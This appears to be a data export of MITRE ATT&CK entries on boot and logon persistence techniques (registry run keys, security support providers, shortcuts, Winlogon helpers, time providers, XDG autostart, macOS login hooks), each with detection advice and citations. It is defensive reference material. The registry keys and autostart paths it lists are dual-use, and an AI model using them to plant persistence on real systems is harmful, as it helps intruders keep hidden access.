<code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nThe Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit</code> and <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell</code> subkeys can automatically launch programs.\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run when any user logs on.\n\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.","url":"https://attack.mitre.org/techniques/T1547/001","created":"23 January 2020","last modified":"30 March 2023","version":"1.2","tactics":"Persistence, Privilege Escalation","detection":"Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders. (Citation: TechNet Autoruns) Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.","platforms":"Windows","data sources":"Command: Command Execution, File: File Modification, Process: Process Creation, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification","is sub-technique":true,"sub-technique of":"T1547","defenses bypassed":null,"contributors":"Dray Agha, @Purp1eW0lf, Huntress Labs; Oddvar Moe, @oddvarmoe","permissions required":"Administrator, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: BlackBerry Amadey 2020),(Citation: Talos Zeus Panda Nov 2017),(Citation: ATT TeamTNT Chimaera September 2020),(Citation: Palo Alto Comnie),(Citation: Talent-Jump Clambling February 2020),(Citation: Group IB Silence Sept 2018),(Citation: Trend Micro DRBControl February 2020),(Citation: Fortinet Remcos Feb 2017),(Citation: Cybereason Oceanlotus May 2017),(Citation: Trend Micro Conficker),(Citation: Securelist WhiteBear Aug 2017),(Citation: Talos Konni May 2017),(Citation: Deep Instinct TA505 Apr 2019),(Citation: Novetta Blockbuster RATs),(Citation: Unit42 BabyShark Feb 2019),(Citation: Securelist MuddyWater Oct 2018),(Citation: Rewterz Sidewinder COVID-19 June 2020),(Citation: Crowdstrike Qakbot October 2020),(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: Korean FSI TA505 2020),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: ESET Grandoreiro April 2020),(Citation: Antiy CERT Ramsay April 2020),(Citation: Symantec Briba May 2012),(Citation: ESET Okrum July 2019),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: ESET Zebrocy Nov 2018),(Citation: Fidelis njRAT June 2013),(Citation: Mandiant UNC3313 Feb 2022),(Citation: McAfee Lazarus Jul 2020),(Citation: F-Secure BlackEnergy 2014),(Citation: Unit 42 Kazuar May 2017),(Citation: Unit 42 Lucifer June 2020),(Citation: Unit 42 Bisonal July 2018),(Citation: Github PowerShell Empire),(Citation: Morphisec ShellTea June 2019),(Citation: Unit 42 DarkHydrus July 2018),(Citation: Unit 42 NETWIRE April 2020),(Citation: FireEye APT37 Feb 2018),(Citation: Lunghi Iron Tiger Linux),(Citation: Talos Promethium June 2020),(Citation: ESET Sednit Part 2),(Citation: Unit 42 BadPatch Oct 2017),(Citation: Carbon Black JCry May 2019),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: KISA Operation Muzabi),(Citation: NTT Security Flagpro new December 2021),(Citation: ESET Casbaneiro Oct 2019),(Citation: Talos NavRAT May 2018),(Citation: Profero APT27 December 2020),(Citation: ESET Gamaredon June 2020),(Citation: Group IB RTM August 2019),(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: Talos Bisonal Mar 2020),(Citation: ThreatStream Evasion Analysis),(Citation: Group IB GrimAgent July 2021),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Kaspersky Sofacy),(Citation: Lotus Blossom Jun 2015),(Citation: NCC Group Team9 June 2020),(Citation: US-CERT Emotet Jul 2018),(Citation: Zscaler Kasidet),(Citation: Trend Micro Muddy Water March 2021),(Citation: Lastline PlugX Analysis),(Citation: ClearSky Wilted Tulip July 2017),(Citation: McAfee Gold Dragon),(Citation: TrendMicro DarkComet Sept 2014),(Citation: Secureworks Karagany July 2019),(Citation: Secureworks DarkTortilla Aug 2022),(Citation: CrowdStrike Ryuk January 2019),(Citation: Cofense NanoCore Mar 2018),(Citation: Picus Emotet Dec 2018),(Citation: Proofpoint TA505 October 2019),(Citation: McAfee Oceansalt Oct 2018),(Citation: FOX-IT May 2016 Mofang),(Citation: McAfee Honeybee),(Citation: Zscaler Lyceum DnsSystem June 2022),(Citation: TrendMicro Gamaredon April 2020),(Citation: TrendMicro Patchwork Dec 2017),(Citation: ESET Sednit Part 1),(Citation: Rancor Unit42 June 2018),(Citation: Cisco DNSMessenger March 2017),(Citation: Palo Alto DNS Requests),(Citation: Forcepoint Monsoon),(Citation: Mandiant No Easy Breach),(Citation: CISA AA20-301A Kimsuky),(Citation: Symantec Dragonfly),(Citation: CERT-EE Gamaredon January 2021),(Citation: Talos Kimsuky Nov 2021),(Citation: FireEye FIN7 April 2017),(Citation: FireEye APT30),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: Unit 42 Inception November 2018),(Citation: CIRCL PlugX March 2013),(Citation: FireEye APT41 March 2020),(Citation: Malwarebytes Saint Bot April 2021),(Citation: Bitdefender Naikon April 2021),(Citation: Palo Alto Rover),(Citation: Red Canary NETWIRE January 2020),(Citation: Baumgartner Naikon 2015),(Citation: TrendMicro PE_URSNIF.A2),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Proofpoint NETWIRE December 2020),(Citation: Talos MuddyWater Jan 2022),(Citation: Accenture SNAKEMACKEREL Nov 2018),(Citation: fsecure NanHaiShu July 2016),(Citation: Trend Micro Tick November 2019),(Citation: Symantec Elfin Mar 2019),(Citation: GitHub PowerSploit May 2012),(Citation: Anomali Pirate Panda April 2020),(Citation: Trend Micro IXESHE 2012),(Citation: Microsoft SIR Vol 19),(Citation: Arxiv Avaddon Feb 2021),(Citation: Lazarus APT January 2022),(Citation: Cylance Shaheen Nov 2018),(Citation: ESET Turla Mosquito May 2018),(Citation: Securelist Remexi Jan 2019),(Citation: Microsoft Win Defender Truvasys Sep 2017),(Citation: Group IB Cobalt Aug 2017),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: ESET Gelsemium June 2021),(Citation: Sophos Maze VM September 2020),(Citation: Microsoft FinFisher March 2018),(Citation: Bitdefender APT28 Dec 2015),(Citation: CrowdStrike Putter Panda),(Citation: Unit 42 NOKKI Sept 2018),(Citation: FireEye FIN10 June 2017),(Citation: Nccgroup Emissary Panda May 2018),(Citation: Trend Micro Qakbot May 2020),(Citation: ESET Dukes October 2019),(Citation: FireEye SMOKEDHAM June 2021),(Citation: CyberBit Early Bird Apr 2018),(Citation: FireEye MuddyWater Mar 2018),(Citation: Unit 42 Nokki Oct 2018),(Citation: FireEye APT10 April 2017),(Citation: Microsoft Iranian Threat Actor Trends November 2021),(Citation: Talos Oblique RAT March 2021),(Citation: Cybereason Molerats Dec 2020),(Citation: TrendMicro Pawn Storm Dec 2020),(Citation: TrendMicro BKDR_URSNIF.SM),(Citation: CheckPoint Naikon May 2020),(Citation: Unit42 Xbash Sept 2018),(Citation: Volexity PowerDuke November 2016),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: Accenture Dragonfish Jan 2018),(Citation: NCC Group APT15 Alive and Strong),(Citation: McAfee Netwire Mar 2015),(Citation: McAfee Sharpshooter December 2018),(Citation: Palo Alto Gamaredon Feb 2017),(Citation: Microsoft Kasidet),(Citation: FireEye FIN7 Aug 2018),(Citation: Uptycs Confucius APT Jan 2021),(Citation: Anomali Evasive Maneuvers July 2015),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: IBM TA505 April 2020),(Citation: ESET GreyEnergy Oct 2018),(Citation: Dell Sakula),(Citation: Proofpoint Leviathan Oct 2017),(Citation: Kaspersky Darkhotel),(Citation: FireEye APT39 Jan 2019),(Citation: Kaspersky Cloud Atlas December 2014),(Citation: ESET LoJax Sept 2018),(Citation: TrendMicro Taidoor),(Citation: Cybereason Chaes Nov 2020),(Citation: F-Secure CozyDuke),(Citation: Symantec Darkmoon Aug 2005),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: Talos Rocke August 2018),(Citation: CopyKittens Nov 2015),(Citation: Securelist Octopus Oct 2018),(Citation: Accenture Hogfish April 2018),(Citation: Nccgroup Gh0st April 2018),(Citation: Prevailion EvilNum May 2020),(Citation: ESET Sednit USBStealer 2014),(Citation: Lookout Dark Caracal Jan 2018),(Citation: FireEye APT41 Aug 2019),(Citation: ZScaler Hacking Team),(Citation: SecureList Griffon May 2019),(Citation: Novetta Blockbuster),(Citation: Check Point Warzone Feb 2020),(Citation: Proofpoint TA416 November 2020),(Citation: FireEye FIN6 April 2016),(Citation: Kaspersky LuminousMoth July 2021),(Citation: Bitdefender LuminousMoth July 2021),(Citation: FireEye Hancitor),(Citation: ASERT InnaputRAT April 2018),(Citation: Talos Group123),(Citation: FireEye Operation Double Tap),(Citation: Cofense Astaroth Sept 2018),(Citation: Prevx Carberp March 2011),(Citation: FinFisher Citation),(Citation: Secureworks MCMD July 2019),(Citation: ESET Gazer Aug 2017),(Citation: ESET Zebrocy May 2019),(Citation: GDATA Zeus Panda June 2017),(Citation: ESET OceanLotus Mar 2019),(Citation: DFIR Phosphorus November 2021),(Citation: ESET EvilNum July 2020),(Citation: Trend Micro AvosLocker Apr 2022),(Citation: Symantec Backdoor.Mivast),(Citation: Cylance Dust Storm),(Citation: Microsoft Holmium June 2020),(Citation: Fortinet Agent Tesla April 2018),(Citation: FireEye Periscope March 2018),(Citation: NCSC GCHQ Small Sieve Jan 2022),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: Emissary Trojan Feb 2016),(Citation: Cylance Machete Mar 2017),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Palo Alto Reaver Nov 2017),(Citation: PaloAlto DNS Requests May 2016),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Malwarebytes Kimsuky June 2021),(Citation: IBM Grandoreiro April 2020),(Citation: Blasco 2013),(Citation: Novetta Winnti April 2015),(Citation: Cyphort EvilBunny Dec 2014),(Citation: Malwarebytes Higaisa 2020),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Unit 42 SeaDuke 2015),(Citation: Medium Metamorfo Apr 2020),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: Trend Micro Qakbot December 2020),(Citation: ESET InvisiMole June 2020),(Citation: Fidelis INOCNATION),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: FireEye Metamorfo Apr 2018),(Citation: BlackBerry Bahamut),(Citation: US-CERT TA18-074A),(Citation: Reaqta MuddyWater November 2017),(Citation: Cybereason Bazar July 2020),(Citation: FireEye APT33 Guardrail),(Citation: IBM IcedID November 2017),(Citation: Kaspersky MoleRATs April 2019),(Citation: Symantec Vasport May 2012),(Citation: Securelist Machete Aug 2014),(Citation: SentinelLabs Agent Tesla Aug 2020),(Citation: ESET Operation Groundbait),(Citation: ClearSky Charming Kitten Dec 2017),(Citation: ESET Turla Mosquito Jan 2018),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: Gh0stRAT ATT March 2019),(Citation: PowerSploit Documentation),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: Talos MuddyWater May 2019),(Citation: Palo Alto OilRig May 2016),(Citation: Zscaler Higaisa 2020),(Citation: Group IB Ransomware September 2020),(Citation: ESET Trickbot Oct 2020),(Citation: Carbon Black HotCroissant April 2020),(Citation: Symantec Emotet Jul 2018),(Citation: ESET RTM Feb 2017),(Citation: Rewterz Sidewinder APT April 2020),(Citation: Gigamon Berserk Bear October 2021),(Citation: GitHub QuasarRAT),(Citation: Zscaler Cobian Aug 2017),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Group IB APT 41 June 2021),(Citation: DustySky),(Citation: Unit 42 C0d0so0 Jan 2016),(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020),(Citation: Fortinet Metamorfo Feb 2020),(Citation: Securelist Kimsuky Sept 2013),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: Talos PoetRAT April 2020),(Citation: CISA AR18-352A Quasar RAT December 2018),(Citation: Cylance Cleaver),(Citation: Trend Micro njRAT 2018),(Citation: Malwarebytes DarkComet March 2018),(Citation: Cymmetria Patchwork),(Citation: FireEye CARBANAK June 2017),(Citation: Cyble Sidewinder September 2020),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: Crowdstrike Indrik November 2018),(Citation: Proofpoint LookBack Malware Aug 2019),(Citation: Malwarebytes SmokeLoader 2016),(Citation: GitHub Pupy),"}
{"ID":"T1547.005","name":"Boot or Logon Autostart Execution: Security Support Provider","description":"Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.\n\nThe SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)","url":"https://attack.mitre.org/techniques/T1547/005","created":"24 January 2020","last modified":"25 March 2020","version":"1.0","tactics":"Persistence, Privilege Escalation","detection":"Monitor the Registry for changes to the SSP Registry keys. Monitor the LSA process for DLL loads. Windows 8.1 and Windows Server 2012 R2 may generate events when unsigned SSP DLLs try to load into the LSA by setting the Registry key <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LSASS.exe</code> with AuditLevel = 8. (Citation: Graeber 2014) (Citation: Microsoft Configure LSA)","platforms":"Windows","data sources":"Command: Command Execution, Module: Module Load, Windows Registry: Windows Registry Key Modification","is sub-technique":true,"sub-technique of":"T1547","defenses bypassed":null,"contributors":null,"permissions required":"Administrator","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Deply Mimikatz),(Citation: Github PowerShell Empire),(Citation: GitHub PowerSploit May 2012),(Citation: PowerSploit Documentation),(Citation: Microsoft Configure LSA),(Citation: Graeber 2014)"}
{"ID":"T1547.009","name":"Boot or Logon Autostart Execution: Shortcut Modification","description":"Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.\n\nAdversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence.(Citation: Shortcut for Persistence ) Although often used as payloads in an infection chain (e.g. [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)), adversaries may also create a new shortcut as a means of indirection, while also abusing [Masquerading](https://attack.mitre.org/techniques/T1036) to make the malicious shortcut appear as a legitimate program. Adversaries can also edit the target path or entirely replace an existing shortcut so their malware will be executed instead of the intended legitimate program.\n\nShortcuts can also be abused to establish persistence by implementing other methods. For example, LNK browser extensions may be modified (e.g. [Browser Extensions](https://attack.mitre.org/techniques/T1176)) to persistently launch malware.","url":"https://attack.mitre.org/techniques/T1547/009","created":"24 January 2020","last modified":"30 March 2023","version":"1.2","tactics":"Persistence, Privilege Escalation","detection":"Since a shortcut's target path likely will not change, modifications to shortcut files that do not correlate with known software changes, patches, removal, etc., may be suspicious. Analysis should attempt to relate shortcut file change or creation events to other potentially suspicious events based on known adversary behavior such as process launches of unknown executables that make network connections.\n\nMonitor for LNK files created with a Zone Identifier value greater than 1, which may indicate that the LNK file originated from outside of the network.(Citation: BSidesSLC 2020 - LNK Elastic)","platforms":"Windows","data sources":"File: File Creation, File: File Modification, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1547","defenses bypassed":null,"contributors":"Bobby, Filar, Elastic; David French, Elastic; Travis Smith, Tripwire","permissions required":"Administrator, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: NCC Group Team9 June 2020),(Citation: IBM Grandoreiro April 2020),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: Palo Alto Comnie),(Citation: Unit 42 SeaDuke 2015),(Citation: Cybereason Astaroth Feb 2019),(Citation: Talos Micropsia June 2017),(Citation: Securelist WhiteBear Aug 2017),(Citation: ESET GreyEnergy Oct 2018),(Citation: Talos Konni May 2017),(Citation: ESET InvisiMole June 2020),(Citation: Proofpoint Leviathan Oct 2017),(Citation: FireEye APT39 Jan 2019),(Citation: Accenture Hogfish April 2018),(Citation: Cybereason Bazar July 2020),(Citation: ESET Okrum July 2019),(Citation: FireEye APT30),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Baumgartner Naikon 2015),(Citation: F-Secure BlackEnergy 2014),(Citation: Unit 42 Kazuar May 2017),(Citation: Github PowerShell Empire),(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: Palo Alto OilRig May 2016),(Citation: Cofense Astaroth Sept 2018),(Citation: Unit 42 DarkHydrus July 2018),(Citation: ESET Gazer Aug 2017),(Citation: Cylance Dust Storm),(Citation: Cylance Cleaver),(Citation: FireEye Periscope March 2018),(Citation: Unit42 DarkHydrus Jan 2019),(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: Palo Alto Reaver Nov 2017),(Citation: UCF STIG Symbolic Links)"}
{"ID":"T1547.003","name":"Boot or Logon Autostart Execution: Time Providers","description":"Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains.(Citation: Microsoft W32Time Feb 2018) W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.(Citation: Microsoft TimeProvider)\n\nTime providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of  <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\</code>.(Citation: Microsoft TimeProvider) The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed.(Citation: Microsoft TimeProvider)\n\nAdversaries may abuse this architecture to establish persistence, specifically by registering and enabling a malicious DLL as a time provider. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account.(Citation: Github W32Time Oct 2017)","url":"https://attack.mitre.org/techniques/T1547/003","created":"24 January 2020","last modified":"20 April 2022","version":"1.0","tactics":"Persistence, Privilege Escalation","detection":"Baseline values and monitor/analyze activity related to modifying W32Time information in the Registry, including application programming interface (API) calls such as <code>RegCreateKeyEx</code> and <code>RegSetValueEx</code> as well as execution of the W32tm.exe utility.(Citation: Microsoft W32Time May 2017) There is no restriction on the number of custom time providers registrations, though each may require a DLL payload written to disk.(Citation: Github W32Time Oct 2017)\n\nThe Sysinternals Autoruns tool may also be used to analyze auto-starting locations, including DLLs listed as time providers.(Citation: TechNet Autoruns)","platforms":"Windows","data sources":"Command: Command Execution, Module: Module Load, Process: Process Creation, Windows Registry: Windows Registry Key Modification","is sub-technique":true,"sub-technique of":"T1547","defenses bypassed":null,"contributors":"Scott Lundgren, @5twenty9, Carbon Black","permissions required":"Administrator, SYSTEM","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":",(Citation: Microsoft W32Time May 2017)"}
{"ID":"T1547.004","name":"Boot or Logon Autostart Execution: Winlogon Helper DLL","description":"Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in <code>HKLM\\Software[\\\\Wow6432Node\\\\]\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> and <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> are used to manage additional helper programs and functionalities that support Winlogon.(Citation: Cylance Reg Persistence Sept 2013) \n\nMalicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: (Citation: Cylance Reg Persistence Sept 2013)\n\n* Winlogon\\Notify - points to notification package DLLs that handle Winlogon events\n* Winlogon\\Userinit - points to userinit.exe, the user initialization program executed when a user logs on\n* Winlogon\\Shell - points to explorer.exe, the system shell executed when a user logs on\n\nAdversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.","url":"https://attack.mitre.org/techniques/T1547/004","created":"24 January 2020","last modified":"30 March 2023","version":"1.0","tactics":"Persistence, Privilege Escalation","detection":"Monitor for changes to Registry entries associated with Winlogon that do not correlate with known software, patch cycles, etc. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current Winlogon helper values. (Citation: TechNet Autoruns)  New DLLs written to System32 that do not correlate with known good software or patching may also be suspicious.\n\nLook for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.","platforms":"Windows","data sources":"Command: Command Execution, Module: Module Load, Windows Registry: Windows Registry Key Modification","is sub-technique":true,"sub-technique of":"T1547","defenses bypassed":null,"contributors":"Praetorian","permissions required":"Administrator, SYSTEM","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Microsoft PLATINUM April 2016),(Citation: CitizenLab KeyBoy Nov 2016),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: Unit 42 Tropic Trooper Nov 2016),(Citation: Secureworks DarkTortilla Aug 2022),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Zscaler Bazar September 2020),(Citation: Securelist Remexi Jan 2019),(Citation: PWC KeyBoys Feb 2017),(Citation: Unit42 Cannon Nov 2018),(Citation: ESET Gazer Aug 2017),(Citation: ESET Turla Mosquito Jan 2018),(Citation: Windows Commands JPCERT),(Citation: Beechey 2010),(Citation: NSA MS AppLocker)"}
{"ID":"T1547.013","name":"Boot or Logon Autostart Execution: XDG Autostart Entries","description":"Adversaries may modify XDG autostart entries to execute programs or commands during system boot. Linux desktop environments that are XDG compliant implement functionality for XDG autostart entries. These entries will allow an application to automatically start during the startup of a desktop environment after user logon. By default, XDG autostart entries are stored within the <code>/etc/xdg/autostart</code> or <code>~/.config/autostart</code> directories and have a .desktop file extension.(Citation: Free Desktop Application Autostart Feb 2006)\n\nWithin an XDG autostart entry file, the <code>Type</code> key specifies if the entry is an application (type 1), link (type 2) or directory (type 3). The <code>Name</code> key indicates an arbitrary name assigned by the creator and the <code>Exec</code> key indicates the application and command line arguments to execute.(Citation: Free Desktop Entry Keys)\n\nAdversaries may use XDG autostart entries to maintain persistence by executing malicious commands and payloads, such as remote access tools, during the startup of a desktop environment. Commands included in XDG autostart entries with execute after user logon in the context of the currently logged on user. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make XDG autostart entries look as if they are associated with legitimate programs.","url":"https://attack.mitre.org/techniques/T1547/013","created":"10 September 2019","last modified":"10 November 2020","version":"1.0","tactics":"Persistence, Privilege Escalation","detection":"Malicious XDG autostart entries may be detected by auditing file creation and modification events within the <code>/etc/xdg/autostart</code> and <code>~/.config/autostart</code> directories. Depending on individual configurations, defenders may need to query the environment variables <code>$XDG_CONFIG_HOME</code> or <code>$XDG_CONFIG_DIRS</code> to determine the paths of Autostart entries. Autostart entry files not associated with legitimate packages may be considered suspicious. Suspicious entries can also be identified by comparing entries to a trusted system baseline.\n \nSuspicious processes or scripts spawned in this manner will have a parent process of the desktop component implementing the XDG specification and will execute as the logged on user.","platforms":"Linux","data sources":"Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1547","defenses bypassed":null,"contributors":"Tony Lambert, Red Canary","permissions required":"root, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Red Canary NETWIRE January 2020),(Citation: Fysbis Dr Web Analysis),"}
{"ID":"T1037","name":"Boot or Logon Initialization Scripts","description":"Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence. Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  \n\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. \n\nAn adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.","url":"https://attack.mitre.org/techniques/T1037","created":"31 May 2017","last modified":"30 March 2023","version":"2.1","tactics":"Persistence, Privilege Escalation","detection":"Monitor logon scripts for unusual access by abnormal users or at abnormal times. Look for files added or modified by unusual accounts outside of normal administration duties. Monitor running process for actions that could be indicative of abnormal programs or executables running upon logon.","platforms":"Linux, Windows, macOS","data sources":"Active Directory: Active Directory Object Modification, Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation, Windows Registry: Windows Registry Key Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Anomali Rocke March 2019),"}
{"ID":"T1037.002","name":"Boot or Logon Initialization Scripts: Login Hook","description":"Adversaries may use a Login Hook to establish persistence executed upon user logon. A login hook is a plist file that points to a specific script to execute with root privileges upon user logon. The plist file is located in the <code>/Library/Preferences/com.apple.loginwindow.plist</code> file and can be modified using the <code>defaults</code> command-line utility. This behavior is the same for logout hooks where a script can be executed upon user logout. All hooks require administrator permissions to modify or create hooks.(Citation: Login Scripts Apple Dev)(Citation: LoginWindowScripts Apple Dev) \n\nAdversaries can add or insert a path to a malicious script in the <code>com.apple.loginwindow.plist</code> file, using the <code>LoginHook</code> or <code>LogoutHook</code> key-value pair. The malicious script is executed upon the next user login. If a login hook already exists, adversaries can add additional commands to an existing login hook. There can be only one login and logout hook on a system at a time.(Citation: S1 macOs Persistence)(Citation: Wardle Persistence Chapter)\n\n**Note:** Login hooks were deprecated in 10.11 version of macOS in favor of [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) and [Launch Agent](https://attack.mitre.org/techniques/T1543/001) ","url":"https://attack.mitre.org/techniques/T1037/002","created":"10 January 2020","last modified":"20 April 2022","version":"2.0","tactics":"Persistence, Privilege Escalation","detection":"Monitor logon scripts for unusual access by abnormal users or at abnormal times. Look for files added or modified by unusual accounts outside of normal administration duties. Monitor running process for actions that could be indicative of abnormal programs or executables running upon logon.","platforms":"macOS","data sources":"Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1037","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
